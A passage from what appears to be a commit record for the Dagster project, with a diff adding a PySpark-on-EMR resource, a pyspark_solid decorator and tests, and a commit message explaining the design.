SparkSession.builder.getOrCreate()\n+sc = spark.sparkContext\n+sys.path.insert(0, SparkFiles.getRootDirectory())\n+\n+from dagster import RunConfig\n+from dagster.utils.test import execute_solid_within_pipeline\n+\n+from {pipeline_file} import {pipeline_fn_name}\n+\n+if __name__ == '__main__':\n+    execute_solid_within_pipeline(\n+        {pipeline_fn_name},\n+        '{solid_name}',\n+        environment_dict={environment_dict},\n+        run_config=RunConfig(mode='{mode_name}'),\n+    )\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\nnew file mode 100644\nindex 0000000000..5da9fe2ec7\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/resources.py\n@@ -0,0 +1,237 @@\n+import os\n+\n+import boto3\n+import six\n+from botocore.exceptions import WaiterError\n+from dagster_pyspark import PySparkResourceDefinition\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict, format_for_cli\n+\n+from dagster import Field, check, resource\n+from dagster.core.errors import DagsterInvalidDefinitionError\n+from dagster.seven import get_system_temp_directory\n+\n+from .utils import build_main_file, build_pyspark_zip, get_install_requirements_step\n+\n+# On EMR, Spark is installed here\n+EMR_SPARK_HOME = '\/usr\/lib\/spark\/'\n+\n+\n+class EMRPySparkResource(PySparkResourceDefinition):\n+    def __init__(self, config):\n+        self.config = config\n+        self.emr_client = boto3.client('emr', region_name=self.config['region_name'])\n+        self.s3_client = boto3.client('s3', region_name=self.config['region_name'])\n+\n+        # Construct the SparkSession\n+        super(EMRPySparkResource, self).__init__(self.config.get('spark_conf'))\n+\n+    def get_compute_fn(self, fn, solid_name):\n+        '''Construct new compute function for EMR pyspark execution. In the scenario where we are\n+        running on a Dagster box, we will (1) sync the client code to an S3 staging bucket, and then\n+        (2) invoke execution via the EMR APIs.\n+\n+        On EMR, we'll just return the original solid function body to kick off normal pyspark\n+        execution. Since that will be launched on the EMR master node with YARN, it will\n+        automatically use the EMR cluster for execution.\n+        '''\n+\n+        if self.running_on_emr:\n+            return fn\n+\n+        def new_compute_fn(context):\n+            self._sync_code_to_s3(context, solid_name)\n+            step_defs = self._get_execute_steps(context, solid_name)\n+            steps = self.add_job_flow_steps(step_defs)\n+            self.wait_for_steps(context, steps['StepIds'])\n+\n+        return new_compute_fn\n+\n+    def _sync_code_to_s3(self, context, solid_name):\n+        '''Synchronize the pyspark code to an S3 staging bucket for use on EMR. Note that\n+        requirements are installed separately when a requirements.txt is provided.\n+\n+        For the zip file, consider the following toy example:\n+\n+        # Folder: my_pyspark_project\/\n+        # a.py\n+        def foo():\n+            print(1)\n+\n+        # b.py\n+        def bar():\n+            print(2)\n+\n+        # main.py\n+        from a import foo\n+        from b import bar\n+\n+        foo()\n+        bar()\n+\n+        This will zip up `my_pyspark_project\/` as `my_pyspark_project.zip`. Then, when running\n+        `spark-submit --py-files my_pyspark_project.zip main.py` on EMR this will print 1, 2.\n+\n+        Note that we also dynamically construct main.py to support targeting execution of a single\n+        solid on EMR vs. the entire pipeline.\n+        '''\n+        run_id = context.run_id\n+        main_file = os.path.join(get_system_temp_directory(), '%s-main.py' % run_id)\n+        zip_file = os.path.join(get_system_temp_directory(), '%s-pyspark.zip' % run_id)\n+\n+        try:\n+            build_main_file(\n+                main_file,\n+                mode_name=context.pipeline_run.mode,\n+                pipeline_file=self.config['pipeline_file'],\n+                solid_name=solid_name,\n+                environment_dict=context.environment_dict,\n+                pipeline_fn_name=self.config['pipeline_fn_name'],\n+            )\n+\n+            build_pyspark_zip(\n+                zip_file=zip_file,\n+                path=os.path.dirname(os.path.abspath(self.config['pipeline_file'])),\n+            )\n+\n+            self.s3_client.upload_file(\n+                zip_file, self.config['staging_bucket'], run_id + '\/pyspark.zip'\n+            )\n+            self.s3_client.upload_file(\n+                main_file, self.config['staging_bucket'], run_id + '\/main.py'\n+            )\n+\n+        finally:\n+            if os.path.exists(main_file):\n+                os.unlink(main_file)\n+            if os.path.exists(zip_file):\n+                os.unlink(zip_file)\n+\n+    def _get_execute_steps(self, context, solid_name):\n+        '''From the local Dagster instance, construct EMR steps that will kick off execution on a\n+        remote EMR cluster.\n+        '''\n+        action_on_failure = self.config['action_on_failure']\n+        staging_bucket = self.config['staging_bucket']\n+\n+        run_id = context.run_id\n+        local_root = os.path.dirname(os.path.abspath(self.config['pipeline_file']))\n+\n+        steps = []\n+\n+        # Install Python dependencies if a requirements file exists\n+        requirements_file = self.config.get('requirements_file_path')\n+        if requirements_file and not os.path.exists(requirements_file):\n+            raise DagsterInvalidDefinitionError(\n+                'The requirements.txt file that was specified does not exist'\n+            )\n+\n+        if not requirements_file:\n+            requirements_file = os.path.join(local_root, 'requirements.txt')\n+\n+        if os.path.exists(requirements_file):\n+            with open(requirements_file, 'rb') as f:\n+                python_dependencies = six.ensure_str(f.read()).split('\\n')\n+                steps.append(get_install_requirements_step(python_dependencies, action_on_failure))\n+\n+        # Execute Solid via spark-submit\n+        conf = dict(flatten_dict(self.config.get('spark_conf')))\n+        conf['spark.app.name'] = conf.get('spark.app.name', solid_name)\n+\n+        check.invariant(\n+            conf.get('spark.master', 'yarn') == 'yarn',\n+            desc='spark.master is configured as %s; cannot set Spark master on EMR to anything '\n+            'other than \"yarn\"' % conf.get('spark.master'),\n+        )\n+\n+        steps.append(\n+            {\n+                'Name': 'Execute Solid %s' % solid_name,\n+                'ActionOnFailure': action_on_failure,\n+                'HadoopJarStep': {\n+                    'Jar': 'command-runner.jar',\n+                    'Args': [\n+                        EMR_SPARK_HOME + 'bin\/spark-submit',\n+                        '--master',\n+                        'yarn',\n+                        '--deploy-mode',\n+                        conf.get('spark.submit.deployMode', 'client'),\n+                    ]\n+                    + format_for_cli(list(flatten_dict(conf)))\n+                    + [\n+                        '--py-files',\n+                        's3:\/\/%s\/%s\/pyspark.zip' % (staging_bucket, run_id),\n+                        's3:\/\/%s\/%s\/main.py' % (staging_bucket, run_id),\n+                    ],\n+                },\n+            }\n+        )\n+        return steps\n+\n+    def add_job_flow_steps(self, step_defs):\n+        '''Submit the constructed job flow steps to EMR for execution.\n+        '''\n+        return self.emr_client.add_job_flow_steps(\n+            JobFlowId=self.config['job_flow_id'], Steps=step_defs\n+        )\n+\n+    def wait_for_steps(self, context, step_ids):\n+        '''Uses the boto3 waiter to wait for job flow step completion.\n+        '''\n+        waiter = self.emr_client.get_waiter('step_complete')\n+\n+        try:\n+            context.log.info(\n+                'Waiting for steps: '\n+                + str(\n+                    self.emr_client.list_steps(\n+                        ClusterId=self.config['job_flow_id'], StepIds=step_ids\n+                    )\n+                )\n+            )\n+            for step_id in step_ids:\n+                waiter.wait(\n+                    ClusterId=self.config['job_flow_id'],\n+                    StepId=step_id,\n+                    WaiterConfig={'Delay': 5, 'MaxAttempts': 100},\n+                )\n+        except WaiterError:\n+            context.log.warning('Timed out waiting for EMR steps to finish')\n+\n+    @property\n+    def running_on_emr(self):\n+        '''Detects whether we are running on the EMR cluster\n+        '''\n+        if os.path.exists('\/mnt\/var\/lib\/info\/job-flow.json'):\n+            return True\n+        return False\n+\n+\n+@resource(\n+    {\n+        'pipeline_file': Field(str, description='Path to the file where the pipeline is defined'),\n+        'pipeline_fn_name': Field(str),\n+        'spark_config': spark_config(),\n+        'job_flow_id': Field(str, description='Name of the job flow (cluster) on which to execute'),\n+        'region_name': Field(str),\n+        'action_on_failure': Field(str, is_optional=True, default_value='CANCEL_AND_WAIT'),\n+        'staging_bucket': Field(\n+            str,\n+            is_optional=False,\n+            description='S3 staging bucket to use for staging the produced main.py and zip file of'\n+            ' Python code',\n+        ),\n+        'requirements_file_path': Field(\n+            str,\n+            is_optional=True,\n+            description='Path to a requirements.txt file; the current directory is searched if none'\n+            ' is specified.',\n+        ),\n+    }\n+)\n+def emr_pyspark_resource(init_context):\n+    emr_pyspark = EMRPySparkResource(init_context.resource_config)\n+    try:\n+        yield emr_pyspark\n+    finally:\n+        emr_pyspark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\nnew file mode 100644\nindex 0000000000..b6267f9caf\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws\/emr\/utils.py\n@@ -0,0 +1,63 @@\n+import copy\n+import os\n+import zipfile\n+\n+import six\n+\n+from dagster.utils import script_relative_path\n+\n+\n+def subset_environment_dict(environment_dict, solid_name):\n+    subset = copy.deepcopy(environment_dict)\n+    if 'solids' in subset:\n+        solid_config_keys = list(subset['solids'].keys())\n+        for key in solid_config_keys:\n+            if key != solid_name:\n+                del subset['solids'][key]\n+    return subset\n+\n+\n+def build_main_file(\n+    main_file, mode_name, pipeline_file, solid_name, environment_dict, pipeline_fn_name\n+):\n+    with open(script_relative_path('main.py.template'), 'rb') as f:\n+        main_template_str = six.ensure_str(f.read())\n+\n+    with open(main_file, 'wb') as f:\n+        f.write(\n+            six.ensure_binary(\n+                main_template_str.format(\n+                    mode_name=mode_name,\n+                    pipeline_file=os.path.splitext(os.path.basename(pipeline_file))[0],\n+                    solid_name=solid_name,\n+                    environment_dict=subset_environment_dict(environment_dict, solid_name),\n+                    pipeline_fn_name=pipeline_fn_name,\n+                )\n+            )\n+        )\n+\n+\n+def build_pyspark_zip(zip_file, path):\n+    '''Archives the current path into a file named `zip_file`\n+    '''\n+    with zipfile.ZipFile(zip_file, 'w', zipfile.ZIP_DEFLATED) as zf:\n+        for root, _, files in os.walk(path):\n+            for fname in files:\n+                abs_fname = os.path.join(root, fname)\n+\n+                # Skip various artifacts\n+                if 'pytest' in abs_fname or '__pycache__' in abs_fname or 'pyc' in abs_fname:\n+                    continue\n+\n+                zf.write(abs_fname, os.path.relpath(os.path.join(root, fname), path))\n+\n+\n+def get_install_requirements_step(python_dependencies, action_on_failure, python_binary='python3'):\n+    return {\n+        'Name': 'Install Dependencies',\n+        'ActionOnFailure': action_on_failure,\n+        'HadoopJarStep': {\n+            'Jar': 'command-runner.jar',\n+            'Args': ['sudo', python_binary, '-m', 'pip', 'install'] + python_dependencies,\n+        },\n+    }\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\nnew file mode 100644\nindex 0000000000..f53d93ce79\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/requirements.txt\n@@ -0,0 +1,8 @@\n+boto3\n+dagster\n+dagit\n+dagster_aws\n+dagster_pyspark\n+dagster_spark\n+moto\n+pytest\n\\ No newline at end of file\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\nnew file mode 100644\nindex 0000000000..2505b1f5d0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_pyspark.py\n@@ -0,0 +1,116 @@\n+import os\n+\n+import boto3\n+import pytest\n+from dagster_aws.emr.resources import emr_pyspark_resource\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+from moto import mock_emr\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+from dagster.seven import mock\n+\n+\n+@pyspark_solid\n+def example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pyspark_solid(\n+    name='blah', description='this is a test', config={'foo': Field(str), 'bar': Field(int)}\n+)\n+def other_example_solid(context):\n+    list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+    rdd = context.resources.pyspark.spark_context.parallelize(list_p)\n+    res = rdd.take(2)\n+    for name, age in res:\n+        context.log.info('%s: %d' % (name, age))\n+\n+\n+@pipeline(\n+    mode_defs=[\n+        ModeDefinition('prod', resource_defs={'pyspark': emr_pyspark_resource}),\n+        ModeDefinition('local', resource_defs={'pyspark': pyspark_resource}),\n+    ]\n+)\n+def example_pipe():\n+    example_solid()\n+    other_example_solid()\n+\n+\n+def test_local():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},},\n+        run_config=RunConfig(mode='local'),\n+    )\n+    assert result.success\n+\n+\n+@mock_emr\n+@mock.patch('dagster_aws.emr.resources.EMRPySparkResource.wait_for_steps')\n+def test_pyspark_emr(mock_wait):\n+    client = boto3.client('emr', region_name='us-west-1')\n+\n+    run_job_flow_args = dict(\n+        Instances={\n+            'InstanceCount': 1,\n+            'KeepJobFlowAliveWhenNoSteps': True,\n+            'MasterInstanceType': 'c3.medium',\n+            'Placement': {'AvailabilityZone': 'us-west-1a'},\n+            'SlaveInstanceType': 'c3.xlarge',\n+        },\n+        JobFlowRole='EMR_EC2_DefaultRole',\n+        LogUri='s3:\/\/mybucket\/log',\n+        Name='cluster',\n+        ServiceRole='EMR_DefaultRole',\n+        VisibleToAllUsers=True,\n+    )\n+\n+    job_flow_id = client.run_job_flow(**run_job_flow_args)['JobFlowId']\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': job_flow_id,\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\n+    assert mock_wait.called_once\n+\n+\n+@pytest.mark.skip\n+def test_do_it_live_emr():\n+    result = execute_pipeline(\n+        example_pipe,\n+        environment_dict={\n+            'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+            'resources': {\n+                'pyspark': {\n+                    'config': {\n+                        'pipeline_file': __file__,\n+                        'pipeline_fn_name': 'example_pipe',\n+                        'job_flow_id': os.environ.get('AWS_EMR_JOB_FLOW_ID'),\n+                        'staging_bucket': 'dagster-scratch-80542c2',\n+                        'region_name': 'us-west-1',\n+                    }\n+                }\n+            },\n+        },\n+        run_config=RunConfig(mode='prod'),\n+    )\n+    assert result.success\ndiff --git a\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\nnew file mode 100644\nindex 0000000000..f23691ea3a\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-aws\/dagster_aws_tests\/emr_tests\/test_utils.py\n@@ -0,0 +1,23 @@\n+from dagster_aws.emr.utils import subset_environment_dict\n+\n+\n+def test_subset_environment_dict():\n+    environment_dict = {\n+        'solids': {'blah': {'config': {'foo': 'a string', 'bar': 123}}},\n+        'resources': {\n+            'pyspark': {\n+                'config': {\n+                    'pipeline_file': 'dagster_aws_tests\/emr_tests\/test_pyspark.py',\n+                    'pipeline_fn_name': 'pipe',\n+                    'job_flow_id': 'j-272P42200OZ0Q',\n+                    'staging_bucket': 'dagster-scratch-80542c2',\n+                    'region_name': 'us-west-1',\n+                }\n+            }\n+        },\n+    }\n+    res = subset_environment_dict(environment_dict, 'blah')\n+    assert res == environment_dict\n+\n+    res = subset_environment_dict(environment_dict, 'not_here')\n+    assert res['solids'] == {}\ndiff --git a\/python_modules\/libraries\/dagster-aws\/setup.py b\/python_modules\/libraries\/dagster-aws\/setup.py\nindex acfa7dd513..892c7befed 100644\n--- a\/python_modules\/libraries\/dagster-aws\/setup.py\n+++ b\/python_modules\/libraries\/dagster-aws\/setup.py\n@@ -39,8 +39,8 @@ def _do_setup(name='dagster-aws'):\n         packages=find_packages(exclude=['test']),\n         include_package_data=True,\n         install_requires=['boto3==1.9.*', 'dagster', 'requests', 'terminaltables'],\n+        extras_require={'pyspark': ['dagster-pyspark']},\n         tests_require=['moto==1.3.*'],\n-        extras_require={':python_version<\"3\"': ['backports.tempfile']},\n         entry_points={'console_scripts': ['dagster-aws = dagster_aws.cli.cli:main']},\n         zip_safe=False,\n     )\ndiff --git a\/python_modules\/libraries\/dagster-aws\/tox.ini b\/python_modules\/libraries\/dagster-aws\/tox.ini\nindex f84b4bbfdf..bf5270ee64 100644\n--- a\/python_modules\/libraries\/dagster-aws\/tox.ini\n+++ b\/python_modules\/libraries\/dagster-aws\/tox.ini\n@@ -10,6 +10,8 @@ platform =\n deps =\n   -e ..\/..\/dagster\n   -r ..\/..\/dagster\/dev-requirements.txt\n+  -e ..\/dagster-spark\n+  -e ..\/dagster-pyspark\n   -r .\/dev-requirements.txt\n   -e .\n usedevelop = true\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\nindex 5f1367b451..94eef4bb83 100644\n--- a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/__init__.py\n@@ -1,10 +1,7 @@\n import os\n \n-from dagster_spark.configs_spark import spark_config\n-from dagster_spark.utils import flatten_dict\n from pyspark.rdd import RDD\n from pyspark.sql import DataFrame as NativeSparkDataFrame\n-from pyspark.sql import SparkSession\n \n from dagster import (\n     Bool,\n@@ -22,6 +19,14 @@\n from dagster.core.types import Selector, input_selector_schema, output_selector_schema\n from dagster.core.types.runtime import define_any_type\n \n+from .decorators import pyspark_solid\n+from .resources import (\n+    PySparkResourceDefinition,\n+    pyspark_resource,\n+    spark_session_from_config,\n+    spark_session_resource,\n+)\n+\n \n @input_selector_schema(\n     Selector(\n@@ -78,25 +83,6 @@ def write_rdd(context, file_type, file_options, spark_rdd):\n )\n \n \n-def spark_session_from_config(spark_conf=None):\n-    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n-    builder = SparkSession.builder\n-    flat = flatten_dict(spark_conf)\n-    for key, value in flat:\n-        builder = builder.config(key, value)\n-\n-    return builder.getOrCreate()\n-\n-\n-@resource({'spark_conf': spark_config()})\n-def spark_session_resource(init_context):\n-    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n-    try:\n-        yield spark\n-    finally:\n-        spark.stop()\n-\n-\n @output_selector_schema(\n     Selector(\n         {\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\nnew file mode 100644\nindex 0000000000..ee8fd82c47\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/decorators.py\n@@ -0,0 +1,63 @@\n+from dagster import check, solid\n+\n+\n+def pyspark_solid(\n+    name=None,\n+    description=None,\n+    input_defs=None,\n+    output_defs=None,\n+    config=None,\n+    required_resource_keys=None,\n+    metadata=None,\n+    step_metadata_fn=None,\n+    pyspark_resource_key=None,\n+):\n+    # Permit the user to provide a named pyspark resource\n+    pyspark_resource_key = check.opt_str_param(\n+        pyspark_resource_key, 'pyspark_resource_key', default='pyspark'\n+    )\n+\n+    # Expect a pyspark resource\n+    required_resource_keys = check.opt_set_param(required_resource_keys, 'required_resource_keys')\n+    required_resource_keys.add(pyspark_resource_key)\n+\n+    # nonlocal keyword not available in Python 2\n+    non_local = {'name': name, 'required_resource_keys': required_resource_keys}\n+\n+    # Handle when we're called bare without arguments (e.g. name is actually the callable, not the\n+    # solid name)\n+    if callable(name):\n+\n+        @solid(name=name.__name__, required_resource_keys=required_resource_keys)\n+        def new_compute_fn(context):\n+            return context.resources.pyspark.get_compute_fn(fn=name, solid_name=name.__name__)(\n+                context\n+            )\n+\n+        return new_compute_fn\n+\n+    def wrap(fn):\n+        name = non_local['name'] or fn.__name__\n+\n+        @solid(\n+            name=name,\n+            description=description,\n+            input_defs=input_defs,\n+            output_defs=output_defs,\n+            config=config,\n+            required_resource_keys=non_local['required_resource_keys'],\n+            metadata=metadata,\n+            step_metadata_fn=step_metadata_fn,\n+        )\n+        def new_compute_fn(context):\n+            from .resources import PySparkResourceDefinition\n+\n+            spark = check.inst(\n+                getattr(context.resources, pyspark_resource_key), PySparkResourceDefinition\n+            )\n+\n+            return spark.get_compute_fn(fn, name)(context)\n+\n+        return new_compute_fn\n+\n+    return wrap\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\nnew file mode 100644\nindex 0000000000..fc3b956019\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark\/resources.py\n@@ -0,0 +1,61 @@\n+import abc\n+\n+import six\n+from dagster_spark.configs_spark import spark_config\n+from dagster_spark.utils import flatten_dict\n+from pyspark.sql import SparkSession\n+\n+from dagster import check, resource\n+\n+\n+def spark_session_from_config(spark_conf=None):\n+    spark_conf = check.opt_dict_param(spark_conf, 'spark_conf')\n+    builder = SparkSession.builder\n+    flat = flatten_dict(spark_conf)\n+    for key, value in flat:\n+        builder = builder.config(key, value)\n+\n+    return builder.getOrCreate()\n+\n+\n+class PySparkResourceDefinition(six.with_metaclass(abc.ABCMeta)):\n+    def __init__(self, spark_conf):\n+        self._spark_session = spark_session_from_config(spark_conf)\n+\n+    @property\n+    def spark_session(self):\n+        return self._spark_session\n+\n+    @property\n+    def spark_context(self):\n+        return self.spark_session.sparkContext\n+\n+    def stop(self):\n+        self._spark_session.stop()\n+\n+    @abc.abstractmethod\n+    def get_compute_fn(self, fn, solid_name):\n+        pass\n+\n+\n+class SystemPySparkResource(PySparkResourceDefinition):\n+    def get_compute_fn(self, fn, solid_name):\n+        return fn\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def pyspark_resource(init_context):\n+    pyspark = SystemPySparkResource(init_context.resource_config['spark_conf'])\n+    try:\n+        yield pyspark\n+    finally:\n+        pyspark.stop()\n+\n+\n+@resource({'spark_conf': spark_config()})\n+def spark_session_resource(init_context):\n+    spark = spark_session_from_config(init_context.resource_config['spark_conf'])\n+    try:\n+        yield spark\n+    finally:\n+        spark.stop()\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/__init__.py\nnew file mode 100644\nindex 0000000000..e69de29bb2\ndiff --git a\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\nnew file mode 100644\nindex 0000000000..8c8ba519b0\n--- \/dev\/null\n+++ b\/python_modules\/libraries\/dagster-pyspark\/dagster_pyspark_tests\/test_decorators.py\n@@ -0,0 +1,67 @@\n+from dagster_pyspark import pyspark_resource, pyspark_solid\n+\n+from dagster import Field, ModeDefinition, RunConfig, execute_pipeline, pipeline\n+\n+\n+def test_simple_pyspark_decorator():\n+    @pyspark_solid\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\n+\n+\n+def test_named_pyspark_decorator():\n+    @pyspark_solid(name='blah', description='foo bar', config={'foo': Field(str)})\n+    def pyspark_job(context):\n+        rdd = context.resources.pyspark.spark_context.parallelize(range(10))\n+        for item in rdd.collect():\n+            print(item)\n+\n+    @pipeline(mode_defs=[ModeDefinition('default', resource_defs={'pyspark': pyspark_resource})])\n+    def pipe():\n+        pyspark_job()\n+\n+    assert execute_pipeline(\n+        pipe,\n+        environment_dict={'solids': {'blah': {'config': {'foo': 'baz'}}}},\n+        run_config=RunConfig(mode='default'),\n+    ).success\n+\n+\n+def test_default_pyspark_decorator():\n+    @pyspark_solid(pyspark_resource_key='first_pyspark')\n+    def first_pyspark_job(context):\n+        list_p = [('Michelle', 19), ('Austin', 29), ('Lydia', 35)]\n+        rdd = context.resources.first_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pyspark_solid(pyspark_resource_key='last_pyspark')\n+    def last_pyspark_job(context):\n+        list_p = [('John', 19), ('Jennifer', 29), ('Adam', 35), ('Henry', 50)]\n+        rdd = context.resources.last_pyspark.spark_context.parallelize(list_p)\n+        res = rdd.take(2)\n+        for name, age in res:\n+            print('%s: %d' % (name, age))\n+\n+    @pipeline(\n+        mode_defs=[\n+            ModeDefinition(\n+                'default',\n+                resource_defs={'first_pyspark': pyspark_resource, 'last_pyspark': pyspark_resource},\n+            )\n+        ]\n+    )\n+    def pipe():\n+        first_pyspark_job()\n+        last_pyspark_job()\n+\n+    assert execute_pipeline(pipe, run_config=RunConfig(mode='default')).success\ndiff --git a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\nindex 9562480ae1..f08e55ab8c 100644\n--- a\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n+++ b\/python_modules\/libraries\/dagster-spark\/dagster_spark\/utils.py\n@@ -17,7 +17,8 @@ def _flatten_dict(d, result, key_path=None):\n                 result.append(('.'.join(new_key_path), v))\n \n     result = []\n-    _flatten_dict(d, result)\n+    if d is not None:\n+        _flatten_dict(d, result)\n     return result\n \n \n@@ -28,6 +29,10 @@ def parse_spark_config(spark_conf):\n     '''\n \n     spark_conf_list = flatten_dict(spark_conf)\n+    return format_for_cli(spark_conf_list)\n+\n+\n+def format_for_cli(spark_conf_list):\n     return list(\n         itertools.chain.from_iterable([('--conf', '{}={}'.format(*c)) for c in spark_conf_list])\n     )\n","files":{"\/.pylintrc":{"changes":[{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]},{"diff":"\n # See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n [TYPECHECK]\n ignored-classes=responses\n-signature-mutators=solid,composite_solid,lambda_solid\n+signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid\n \n [MASTER]\n ignore=snapshots\n\\ No newline at end of file","add":1,"remove":1,"filename":"\/.pylintrc","badparts":["signature-mutators=solid,composite_solid,lambda_solid"],"goodparts":["signature-mutators=solid,pyspark_solid,composite_solid,lambda_solid"]}],"source":"\n[MESSAGES CONTROL] disable=C,R,duplicate-code,W0511,W1201,W1202,no-init [TYPECHECK] ignored-classes=responses signature-mutators=solid,composite_solid,lambda_solid [MASTER] ignore=snapshots ","sourceWithComments":"[MESSAGES CONTROL]\n\n# Enable the message, report, category or checker with the given id(s). You can\n# either give multiple identifier separated by comma (,) or put this option\n# multiple time.\n#enable=\n\n# Disable the message, report, category or checker with the given id(s). You\n# can either give multiple identifier separated by comma (,) or put this option\n# multiple time (only on the command line, not in the configuration file where\n# it should appear only once).#\n#\n# R - refactoring related checks\n# C - convention related checks\n# W0511 disable TODO warning\n# W1201, W1202 disable log format warning. False positives (I think)\n\ndisable=C,R,duplicate-code,W0511,W1201,W1202,no-init\n\n# See: https:\/\/github.com\/getsentry\/responses\/issues\/74\n[TYPECHECK]\nignored-classes=responses\nsignature-mutators=solid,composite_solid,lambda_solid\n\n[MASTER]\nignore=snapshots"}},"msg":"pyspark on EMR\n\nSummary:\n**Summary**\nPutting this up for discussion.\n\nThis is a (rough) cut at the thing @sashank, @max and I were discussing on Friday, where we use a decorator to express that a pyspark solid's compute function should behave differently when shipping compute to a remote EMR cluster.\n\n**Context**\nEMR must run pyspark workloads with `yarn` specified as the master URI. To run this way, Spark must have access to a local Hadoop\/Spark\/YARN install on the machine running `spark-submit` or calling `SparkSession.builder.getOrCreate()`, and this local installation must be properly configured with `core-site.xml`, etc. along with all other Hadoop XML files that define the DNS names and hosts in the YARN cluster.\n\nThis is easy when invoking a job directly on the EMR master (already configured), or through the EMR `boto3` APIs, but not something you can set up locally (very difficult to get everything configured correctly, and fragile).\n\nBecause of this, there isn't a way to tell EMR to \"run just this one solid\"\u2014EMR expects us to invoke `spark-submit <options> foo.py` either in a shell command on the master or via the EMR APIs, and it expects `foo.py` to be a self-contained pyspark application.\n\nGiven this, there is no obvious way to have pyspark solids structured like we've done historically, because the locally-constructed `SparkSession` won't be capable of interacting with a remote EMR cluster.\n\n**Options**\n\nWe have a few options that I can think of so far:\n\n1. Open all requisite ports between local machine and EMR cluster for Spark\/YARN\/Hadoop to communicate. This is wildly insecure (YARN has no security, anyone can then submit work to the YARN cluster)  so not a real option. This also would require all of the local Spark\/YARN\/Hadoop installation and XML configs, which is a huge burden to get configured right\u2014imagine how you'd have to reconfigure everything for every cluster you talk to in the ephemeral case.\n2. Maintain SSH tunnels between the local host running dagster and EMR cluster. This is very fragile, as the job will immediately be killed if your networking changes, and annoying to maintain 